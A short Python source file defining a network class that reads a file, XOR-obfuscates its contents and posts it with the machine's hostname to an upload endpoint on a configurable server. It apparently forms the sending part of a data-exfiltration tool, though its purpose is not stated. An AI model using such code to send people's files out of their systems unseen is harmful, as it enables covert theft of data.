import os
import socket
import requests
import Encryptor


class Network:
    def __init__(self, server_ip, key, port):
        self.url = f"http://{server_ip}:{port}/upload"
        self.hostname = socket.gethostname()
        self.encrypt = Encryptor.Encryptor(key)

    def send_data(self, filename):
        if not os.path.exists(filename):
            print(f"File '{filename}' not found.")
            return

        with open(filename, "rb") as file:
            # files = {'file': file.read()}
            # files = {'file': self.encrypt.xor_decrypt(file.read())}
            files = {'file': self.encrypt.xor_decrypt(file.read().decode(errors='ignore')).encode()}
            data = {'hostname': self.hostname}
            response = requests.post(self.url, files=files, data=data)
            print(response.json())





